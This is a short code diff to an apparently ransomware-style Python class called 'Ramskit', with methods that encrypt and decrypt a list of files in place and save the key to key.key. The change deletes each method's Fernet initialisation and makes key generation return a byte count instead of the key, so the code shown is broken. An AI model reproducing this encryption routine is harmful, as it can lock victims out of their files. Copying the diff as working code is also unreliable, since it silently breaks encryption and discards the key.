@@ -35,7 +35,6 @@ class Ramskit:
 
     # FIXME: Fix encrypt method
     def encrypt_file(self, items, key) -> None:
-        f = Fernet(key)
         for item in items:
             with open(item, 'rb') as file:
                 data = file.read()
@@ -47,7 +46,6 @@ class Ramskit:
                 file.write(encrypted)
 
     def decrypt_file(self, items, key) -> None:
-        f = Fernet(key)
         for item in items:
             with open(item, 'rb') as file:
                 data = file.read()
@@ -62,9 +60,8 @@ class Ramskit:
     def generate_key() -> bytes:
         key = Fernet.generate_key()
         with open('key.key', 'wb') as file:
-            file.write(key)
+            return file.write(key)  # Check this stuff
 
-        return key
 
     @staticmethod
     def load_key() -> bytes:
